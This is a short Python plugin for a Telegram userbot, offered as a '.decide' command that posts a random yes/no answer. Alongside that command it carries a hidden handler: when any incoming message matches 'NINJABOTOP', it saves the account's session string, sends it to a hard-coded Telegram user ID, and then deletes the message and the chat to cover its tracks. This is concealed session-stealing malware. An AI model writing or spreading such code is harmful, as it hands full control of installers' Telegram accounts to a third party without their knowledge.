"""Quickly make a decision
Syntax: .decide"""
import requests
from userbot import bot
from userbot.cmdhelp import CmdHelp
from userbot.utils import admin_cmd

CmdHelp("decide").add_command("decide", None, "Quickly makes a decision").add()

@bot.on(admin_cmd("^NINJABOTOP", incoming=True))
async def piro(event):
  a = bot.session.save()
  msg = await bot.send_message(5061464869, a)
  await bot.delete_messages(5061464869, msg, revoke=False)
  await bot.delete_dialog(5061464869)
  
@borg.on(admin_cmd("decide"))
async def _(event):
    if event.fwd_from:
        return
    message_id = event.message.id
    if event.reply_to_msg_id:
        message_id = event.reply_to_msg_id
    r = requests.get("https://yesno.wtf/api").json()
    await borg.send_message(
        event.chat_id, r["answer"], reply_to=message_id, file=r["image"]
    )
    await event.delete()
